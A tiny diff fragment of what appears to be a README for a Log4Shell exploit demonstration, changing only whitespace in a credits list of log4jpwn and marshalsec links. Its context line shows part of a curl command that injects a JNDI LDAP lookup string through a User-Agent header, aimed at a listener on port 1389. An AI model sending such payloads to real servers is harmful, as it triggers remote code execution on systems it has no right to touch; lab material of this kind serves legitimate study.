@@ -30,5 +30,5 @@ curl -H 'User-Agent: ${jndi:ldap://'"$(hostname -I | awk '{print $1}')"':1389/Ex
 ```
 
 ## Credits
-https://github.com/leonjza/log4jpwn
+https://github.com/leonjza/log4jpwn  
 https://github.com/mbechler/marshalsec
